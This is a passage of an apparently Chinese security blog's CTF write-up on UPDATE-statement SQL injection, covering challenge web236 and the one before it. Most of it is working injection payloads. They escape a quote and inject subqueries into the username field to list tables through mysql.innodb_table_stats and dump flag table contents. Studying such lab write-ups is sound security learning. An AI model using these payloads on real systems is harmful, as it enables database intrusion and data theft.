+<p>同时查询多个列（0x2d为<code>-</code>）</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> concat<span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816173713580.png" alt="image-20230816173713580"></p>
+<hr>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token keyword">where</span> database_name<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>列名（返回的数据有2行，所以要用group_concat）</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> flag23a1<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816174030506.png" alt="image-20230816174030506"></p>
+<hr>
+<h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p>过滤<code>or</code> ，<code>&#39;</code>，<code>flag</code></p>
+<p>实际测试了下，<del>真的有过滤flag吗，如过？</del></p>
+<p>表名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> flag23a1<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>列名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> flaga<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
